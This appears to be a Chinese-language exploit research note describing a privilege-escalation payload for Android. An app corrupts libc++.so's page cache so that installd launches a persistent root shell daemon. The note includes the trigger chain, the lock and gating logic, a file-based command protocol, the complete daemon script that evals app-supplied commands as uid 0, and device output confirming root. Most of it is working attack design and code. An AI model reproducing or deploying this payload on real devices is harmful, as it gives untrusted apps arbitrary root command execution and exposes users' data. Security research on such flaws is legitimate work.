# Root 守护进程载荷（2026-10-25）

> 2026-10-28 文档复核：只更正解释与证据范围，未新增设备实测；当前状态以 [STATUS](../STATUS.md) 为准，历史候选步骤不作为当前执行计划。

> 目标：一次触发后，在**重启前**可以反复以 `uid 0`（`u:r:installd:s0`）执行命令。
> 本页记录已验证的载荷设计与文件协议。

## 1. 触发链

```
App 写 `libc++.so` 页缓存（DirtyFrag）→ 一次 installd 包操作（安装/卸载/编译）
→ installd 走 libbase LogMessage → libc++ sentry 入口跳转 → 载荷运行
```

载荷门控：`uid == 0` 且 `/proc/self/cmdline` 含 `inst`；一次性锁在
`/data/local/tmp/p780_daemon_once`（`O_CREAT|O_EXCL`，注意不能放 `/dev`——installd 无写权限）。

## 2. 载荷行为

1. `fork()`；
2. 子进程 `execve("/system/bin/sh", ["sh","-c", daemon_script], ["PATH=/system/bin"])`；
3. 守护脚本在 `u:r:installd:s0`、`uid 0` 下轮询命令文件。

## 3. 文件协议

| 文件 | 方向 | 说明 |
|---|---|---|
| `/data/local/tmp/p780_state` | 守护→App | `READY` / `BYE` |
| `/data/local/tmp/p780_cmd` | App→守护 | 要执行的 shell 文本 |
| `/data/local/tmp/p780_seq` | App→守护 | 序号（提交标志） |
| `/data/local/tmp/p780_out` | 守护→App | 命令输出 + `SEQ <n> END` |

提交顺序：先写 `p780_cmd`，再写 `p780_seq`；守护读到 seq 才读取命令，执行后把两个文件清空。

守护脚本（已上机验证）：

```sh
umask 0
S=/data/local/tmp/p780_state; C=/data/local/tmp/p780_cmd
Q=/data/local/tmp/p780_seq;  O=/data/local/tmp/p780_out
echo READY > $S; chmod 666 $S
while :; do
  if read -t 1 N < $Q; then
    if read -t 1 M < $C; then
      : > $Q; : > $C
      if [ $M = __quit ]; then echo BYE > $S; break; fi
      { eval $M; } > $O 2>&1
      echo SEQ $N END >> $O
      chmod 666 $O
    fi
  fi
done
```

## 4. 实机验证

```
$ cat /data/local/tmp/p780_state
READY

$ echo 'id; getenforce' > p780_cmd; echo 1 > p780_seq
$ cat /data/local/tmp/p780_out
uid=0(root) gid=0(root) groups=0(root) context=u:r:installd:s0
Enforcing
SEQ 1 END
```

`echo /data/data/* | wc -w` → `282`，记录的是目录枚举数量，不证明可以读取所有应用文件。

## 5. 踩过的坑

| 问题 | 原因 | 处理 |
|---|---|---|
| 载荷完全不执行 | 一次性锁放在 `/dev`，installd 无写权限 | 移到 `/data/local/tmp` |
| 命令被执行两次 | 锁用了 `O_TRUNC` 而非 `O_EXCL`，两个线程都能创建 | 改为 `O_CREAT|O_EXCL`（`0xc1`） |
| 命令被当成管道 | mksh 的 `${L%%|*}` 里 `|` 不做字面量 | 改为两个文件（cmd + seq） |
| 守护进程重复 | 旧载荷的守护进程仍在轮询 | 重启清空，一次只部署一份 |

## 6. 能力边界

- **已记录**：以 uid 0 在部分 `/data` 路径读写（如 `/data/app`、`/data/dalvik-cache`、`/data/local/tmp`）；实际权限取决于路径、标签与调用上下文，不代表全部应用文件，
  执行 `sh` 内建命令与脚本逻辑；
- **不可以**：写 `/system`、`/vendor`；exec 除 `sh` 之外的系统二进制（`toybox` 等）；
- **不持久**：守护进程随重启消失，需重新触发。
